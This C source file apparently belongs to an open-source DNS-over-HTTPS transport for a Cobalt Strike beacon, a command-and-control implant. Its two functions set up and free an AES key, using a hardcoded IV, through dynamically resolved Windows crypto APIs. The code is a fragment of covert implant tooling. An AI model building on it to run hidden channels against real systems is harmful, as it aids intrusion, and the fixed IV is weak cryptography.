/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * CryptAesInit
 *
 * Purpose:
 *
 * Creates the key object for AES
 *
-*/
BOOL CryptAesInit( PBEACON_INSTANCE Ins )
{
	UCHAR Str[MAX_PATH];

	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportKey( Ins->key[1].Provider, Ins->key[1].Ptr, Ins->key[1].Len, 0, 0, &Ins->key[1].Key ) )
		{
			Str[0x0] = 'a';
			Str[0x1] = 'b';
			Str[0x2] = 'c';
			Str[0x3] = 'd';
			Str[0x4] = 'e';
			Str[0x5] = 'f';
			Str[0x6] = 'g';
			Str[0x7] = 'h';
			Str[0x8] = 'i';
			Str[0x9] = 'j';
			Str[0xa] = 'k';
			Str[0xb] = 'l';
			Str[0xc] = 'm'; 
			Str[0xd] = 'n';
			Str[0xe] = 'o';
			Str[0xf] = 'p';

			if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_IV, Str, 0 ) )
			{
				return TRUE;
			};
			Ins->api.CryptDestroyKey( Ins->key[1].Key );
		};
		Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptAesFree
 *
 * Purpose:
 *
 * Free's the associated keys for AES
 *
-*/
VOID CryptAesFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[1].Key );
	Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
};
